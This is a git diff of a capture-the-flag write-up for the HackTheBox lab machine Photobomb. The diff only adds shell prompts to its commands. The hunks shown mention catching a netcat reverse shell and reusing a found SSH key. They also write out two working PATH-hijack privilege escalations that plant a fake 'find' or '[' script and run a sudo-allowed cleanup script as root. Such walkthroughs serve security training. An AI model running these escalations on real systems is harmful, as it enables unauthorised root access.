@@ -32,7 +32,7 @@ PORT   STATE SERVICE VERSION
 The site redirects to `photobomb.htb`, so I added it to `/etc/hosts`:
 
 ```bash
-echo '10.10.11.182 photobomb.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.11.182 photobomb.htb' | sudo tee -a /etc/hosts
 ```
 
 Browsing `http://photobomb.htb/` is a gallery. The page source loads `photobomb.js`, which has the interesting bit:
@@ -98,7 +98,7 @@ With `nc -lvnp 8484` waiting, sending that caught the shell.
 The shell came back as `wizard`, which owns the user flag. There is an SSH key in the home directory, so I pulled it for a stable session instead of the fragile netcat shell.
 
 ```bash
-ssh -i id_rsa wizard@photobomb.htb
+$ ssh -i id_rsa wizard@photobomb.htb
 ```
 
 ## root
@@ -106,7 +106,7 @@ ssh -i id_rsa wizard@photobomb.htb
 First thing on any shell is `sudo -l`:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -122,7 +122,7 @@ User wizard may run the following commands on photobomb:
 The script:
 
 ```bash
-cat /opt/cleanup.sh
+$ cat /opt/cleanup.sh
 ```
 
 ```bash
@@ -141,10 +141,10 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 Most commands use absolute paths or builtins, but `find` is called by bare name. Because I control `PATH`, I can drop a fake `find` earlier in `PATH` and the root script runs mine.
 
 ```bash
-cd /dev/shm
-echo -e '#!/bin/bash\nbash' > find
-chmod +x find
-sudo PATH=$PWD:$PATH /opt/cleanup.sh
+$ cd /dev/shm
+$ echo -e '#!/bin/bash\nbash' > find
+$ chmod +x find
+$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ```
 
 When the script reaches `find`, it executes `/dev/shm/find`, which spawns a root bash. Root shell, root flag.
@@ -152,10 +152,10 @@ When the script reaches `find`, it executes `/dev/shm/find`, which spawns a root
 There is a second route through the same script. The first line is `. `pwd`/.bashrc`, and the box's `.bashrc` contains `enable -n [`, which disables the `[` bash builtin. With the builtin off, the `[ ! -f ... ]` test forces bash to search `PATH` for an external `[` binary. Same `PATH` trick, different hijacked name:
 
 ```bash
-cd /dev/shm
-echo -e '#!/bin/bash\nbash' > [
-chmod +x [
-sudo PATH=$PWD:$PATH /opt/cleanup.sh
+$ cd /dev/shm
+$ echo -e '#!/bin/bash\nbash' > [
+$ chmod +x [
+$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ```
 
 That fires my `[` before `find` is ever reached. Both land root.
